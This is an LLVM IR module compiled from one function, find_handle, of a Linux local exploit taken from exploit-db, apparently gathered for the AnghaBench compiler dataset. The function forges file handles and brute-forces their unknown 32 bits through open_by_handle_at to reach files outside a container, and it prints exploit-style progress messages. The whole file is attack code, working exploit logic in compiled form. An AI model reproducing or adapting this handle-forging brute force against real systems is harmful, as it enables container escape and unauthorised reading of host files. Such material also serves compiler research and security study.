; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_33808.c_find_handle.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_33808.c_find_handle.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.my_file_handle = type { i32, i32, i32* }
%struct.dirent = type { i8*, i32 }
%struct.file_handle = type { i32 }

@__const.find_handle.outh = private unnamed_addr constant %struct.my_file_handle { i32 8, i32 1, i32* null }, align 8
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [20 x i8] c"[*] Resolving '%s'\0A\00", align 1
@O_RDONLY = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [22 x i8] c"[-] open_by_handle_at\00", align 1
@.str.2 = private unnamed_addr constant [14 x i8] c"[-] fdopendir\00", align 1
@.str.3 = private unnamed_addr constant [14 x i8] c"[*] Found %s\0A\00", align 1
@.str.4 = private unnamed_addr constant [22 x i8] c"[+] Match: %s ino=%d\0A\00", align 1
@.str.5 = private unnamed_addr constant [61 x i8] c"[*] Brute forcing remaining 32bit. This can take a while...\0A\00", align 1
@.str.6 = private unnamed_addr constant [25 x i8] c"[*] (%s) Trying: 0x%08x\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @find_handle(i32 %0, i8* %1, %struct.my_file_handle* %2, %struct.my_file_handle* %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca %struct.my_file_handle*, align 8
  %9 = alloca %struct.my_file_handle*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.my_file_handle, align 8
  %13 = alloca i32*, align 8
  %14 = alloca %struct.dirent*, align 8
  %15 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store %struct.my_file_handle* %2, %struct.my_file_handle** %8, align 8
  store %struct.my_file_handle* %3, %struct.my_file_handle** %9, align 8
  store i32 0, i32* %11, align 4
  %16 = bitcast %struct.my_file_handle* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 8 %16, i8* align 8 bitcast (%struct.my_file_handle* @__const.find_handle.outh to i8*), i64 16, i1 false)
  store i32* null, i32** %13, align 8
  store %struct.dirent* null, %struct.dirent** %14, align 8
  %17 = load i8*, i8** %7, align 8
  %18 = call i8* @strchr(i8* %17, i8 signext 47)
  store i8* %18, i8** %7, align 8
  %19 = load i8*, i8** %7, align 8
  %20 = icmp ne i8* %19, null
  br i1 %20, label %33, label %21

21:                                               ; preds = %4
  %22 = load %struct.my_file_handle*, %struct.my_file_handle** %9, align 8
  %23 = getelementptr inbounds %struct.my_file_handle, %struct.my_file_handle* %22, i32 0, i32 2
  %24 = load i32*, i32** %23, align 8
  %25 = load %struct.my_file_handle*, %struct.my_file_handle** %8, align 8
  %26 = getelementptr inbounds %struct.my_file_handle, %struct.my_file_handle* %25, i32 0, i32 2
  %27 = load i32*, i32** %26, align 8
  %28 = call i32 @memcpy(i32* %24, i32* %27, i32 8)
  %29 = load %struct.my_file_handle*, %struct.my_file_handle** %9, align 8
  %30 = getelementptr inbounds %struct.my_file_handle, %struct.my_file_handle* %29, i32 0, i32 1
  store i32 1, i32* %30, align 4
  %31 = load %struct.my_file_handle*, %struct.my_file_handle** %9, align 8
  %32 = getelementptr inbounds %struct.my_file_handle, %struct.my_file_handle* %31, i32 0, i32 0
  store i32 8, i32* %32, align 8
  store i32 1, i32* %5, align 4
  br label %144

33:                                               ; preds = %4
  %34 = load i8*, i8** %7, align 8
  %35 = getelementptr inbounds i8, i8* %34, i32 1
  store i8* %35, i8** %7, align 8
  %36 = load i32, i32* @stderr, align 4
  %37 = load i8*, i8** %7, align 8
  %38 = call i32 (i32, i8*, ...) @fprintf(i32 %36, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str, i64 0, i64 0), i8* %37)
  %39 = load i32, i32* %6, align 4
  %40 = load %struct.my_file_handle*, %struct.my_file_handle** %8, align 8
  %41 = bitcast %struct.my_file_handle* %40 to %struct.file_handle*
  %42 = load i32, i32* @O_RDONLY, align 4
  %43 = call i64 @open_by_handle_at(i32 %39, %struct.file_handle* %41, i32 %42)
  %44 = trunc i64 %43 to i32
  store i32 %44, i32* %10, align 4
  %45 = icmp slt i32 %44, 0
  br i1 %45, label %46, label %48

46:                                               ; preds = %33
  %47 = call i32 @die(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.1, i64 0, i64 0))
  br label %48

48:                                               ; preds = %46, %33
  %49 = load i32, i32* %10, align 4
  %50 = call i32* @fdopendir(i32 %49)
  store i32* %50, i32** %13, align 8
  %51 = icmp eq i32* %50, null
  br i1 %51, label %52, label %54

52:                                               ; preds = %48
  %53 = call i32 @die(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.2, i64 0, i64 0))
  br label %54

54:                                               ; preds = %52, %48
  br label %55

55:                                               ; preds = %89, %54
  %56 = load i32*, i32** %13, align 8
  %57 = call %struct.dirent* @readdir(i32* %56)
  store %struct.dirent* %57, %struct.dirent** %14, align 8
  %58 = load %struct.dirent*, %struct.dirent** %14, align 8
  %59 = icmp ne %struct.dirent* %58, null
  br i1 %59, label %61, label %60

60:                                               ; preds = %55
  br label %90

61:                                               ; preds = %55
  %62 = load i32, i32* @stderr, align 4
  %63 = load %struct.dirent*, %struct.dirent** %14, align 8
  %64 = getelementptr inbounds %struct.dirent, %struct.dirent* %63, i32 0, i32 0
  %65 = load i8*, i8** %64, align 8
  %66 = call i32 (i32, i8*, ...) @fprintf(i32 %62, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.3, i64 0, i64 0), i8* %65)
  %67 = load %struct.dirent*, %struct.dirent** %14, align 8
  %68 = getelementptr inbounds %struct.dirent, %struct.dirent* %67, i32 0, i32 0
  %69 = load i8*, i8** %68, align 8
  %70 = load i8*, i8** %7, align 8
  %71 = load %struct.dirent*, %struct.dirent** %14, align 8
  %72 = getelementptr inbounds %struct.dirent, %struct.dirent* %71, i32 0, i32 0
  %73 = load i8*, i8** %72, align 8
  %74 = call i32 @strlen(i8* %73)
  %75 = call i64 @strncmp(i8* %69, i8* %70, i32 %74)
  %76 = icmp eq i64 %75, 0
  br i1 %76, label %77, label %89

77:                                               ; preds = %61
  %78 = load i32, i32* @stderr, align 4
  %79 = load %struct.dirent*, %struct.dirent** %14, align 8
  %80 = getelementptr inbounds %struct.dirent, %struct.dirent* %79, i32 0, i32 0
  %81 = load i8*, i8** %80, align 8
  %82 = load %struct.dirent*, %struct.dirent** %14, align 8
  %83 = getelementptr inbounds %struct.dirent, %struct.dirent* %82, i32 0, i32 1
  %84 = load i32, i32* %83, align 8
  %85 = call i32 (i32, i8*, ...) @fprintf(i32 %78, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.4, i64 0, i64 0), i8* %81, i32 %84)
  %86 = load %struct.dirent*, %struct.dirent** %14, align 8
  %87 = getelementptr inbounds %struct.dirent, %struct.dirent* %86, i32 0, i32 1
  %88 = load i32, i32* %87, align 8
  store i32 %88, i32* %11, align 4
  br label %90

89:                                               ; preds = %61
  br label %55

90:                                               ; preds = %77, %60
  %91 = load i32, i32* @stderr, align 4
  %92 = call i32 (i32, i8*, ...) @fprintf(i32 %91, i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.5, i64 0, i64 0))
  %93 = load %struct.dirent*, %struct.dirent** %14, align 8
  %94 = icmp ne %struct.dirent* %93, null
  br i1 %94, label %95, label %139

95:                                               ; preds = %90
  store i32 0, i32* %15, align 4
  br label %96

96:                                               ; preds = %135, %95
  %97 = load i32, i32* %15, align 4
  %98 = icmp ult i32 %97, -1
  br i1 %98, label %99, label %138

99:                                               ; preds = %96
  %100 = getelementptr inbounds %struct.my_file_handle, %struct.my_file_handle* %12, i32 0, i32 0
  store i32 8, i32* %100, align 8
  %101 = getelementptr inbounds %struct.my_file_handle, %struct.my_file_handle* %12, i32 0, i32 1
  store i32 1, i32* %101, align 4
  %102 = getelementptr inbounds %struct.my_file_handle, %struct.my_file_handle* %12, i32 0, i32 2
  %103 = load i32*, i32** %102, align 8
  %104 = call i32 @memcpy(i32* %103, i32* %11, i32 4)
  %105 = getelementptr inbounds %struct.my_file_handle, %struct.my_file_handle* %12, i32 0, i32 2
  %106 = load i32*, i32** %105, align 8
  %107 = getelementptr inbounds i32, i32* %106, i64 4
  %108 = call i32 @memcpy(i32* %107, i32* %15, i32 4)
  %109 = load i32, i32* %15, align 4
  %110 = srem i32 %109, 1048576
  %111 = icmp eq i32 %110, 0
  br i1 %111, label %112, label %119

112:                                              ; preds = %99
  %113 = load i32, i32* @stderr, align 4
  %114 = load %struct.dirent*, %struct.dirent** %14, align 8
  %115 = getelementptr inbounds %struct.dirent, %struct.dirent* %114, i32 0, i32 0
  %116 = load i8*, i8** %115, align 8
  %117 = load i32, i32* %15, align 4
  %118 = call i32 (i32, i8*, ...) @fprintf(i32 %113, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.6, i64 0, i64 0), i8* %116, i32 %117)
  br label %119

119:                                              ; preds = %112, %99
  %120 = load i32, i32* %6, align 4
  %121 = bitcast %struct.my_file_handle* %12 to %struct.file_handle*
  %122 = call i64 @open_by_handle_at(i32 %120, %struct.file_handle* %121, i32 0)
  %123 = icmp sgt i64 %122, 0
  br i1 %123, label %124, label %134

124:                                              ; preds = %119
  %125 = load i32*, i32** %13, align 8
  %126 = call i32 @closedir(i32* %125)
  %127 = load i32, i32* %10, align 4
  %128 = call i32 @close(i32 %127)
  %129 = call i32 @dump_handle(%struct.my_file_handle* %12)
  %130 = load i32, i32* %6, align 4
  %131 = load i8*, i8** %7, align 8
  %132 = load %struct.my_file_handle*, %struct.my_file_handle** %9, align 8
  %133 = call i32 @find_handle(i32 %130, i8* %131, %struct.my_file_handle* %12, %struct.my_file_handle* %132)
  store i32 %133, i32* %5, align 4
  br label %144

134:                                              ; preds = %119
  br label %135

135:                                              ; preds = %134
  %136 = load i32, i32* %15, align 4
  %137 = add nsw i32 %136, 1
  store i32 %137, i32* %15, align 4
  br label %96

138:                                              ; preds = %96
  br label %139

139:                                              ; preds = %138, %90
  %140 = load i32*, i32** %13, align 8
  %141 = call i32 @closedir(i32* %140)
  %142 = load i32, i32* %10, align 4
  %143 = call i32 @close(i32 %142)
  store i32 0, i32* %5, align 4
  br label %144

144:                                              ; preds = %139, %124, %21
  %145 = load i32, i32* %5, align 4
  ret i32 %145
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i8* @strchr(i8*, i8 signext) #2

declare dso_local i32 @memcpy(i32*, i32*, i32) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

declare dso_local i64 @open_by_handle_at(i32, %struct.file_handle*, i32) #2

declare dso_local i32 @die(i8*) #2

declare dso_local i32* @fdopendir(i32) #2

declare dso_local %struct.dirent* @readdir(i32*) #2

declare dso_local i64 @strncmp(i8*, i8*, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @closedir(i32*) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @dump_handle(%struct.my_file_handle*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
